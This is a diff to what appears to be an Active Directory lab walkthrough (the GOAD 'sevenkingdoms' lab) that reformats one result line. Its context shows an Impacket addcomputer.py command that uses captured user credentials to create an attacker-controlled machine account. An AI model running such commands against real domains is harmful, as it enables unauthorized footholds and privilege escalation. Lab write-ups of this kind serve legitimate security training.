@@ -19,5 +19,6 @@ Result: Confirmed MachineAccountQuota: 10.
 Using the jon.snow credentials, the attacker adds a new computer object to the domain to be used as a "controlled" identity.
 
 Command:  addcomputer.py -computer-name 'SYSKEY$' -computer-pass 'Password123!' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
-Result: Successfully added machine account SYSKEY$ with password Password123!
+
+#### Result: Successfully added machine account SYSKEY$ with password Password123!
 <img width="1919" height="152" alt="image" src="https://github.com/user-attachments/assets/deed48d5-0029-4d39-b54a-46b6fc4617c6" />
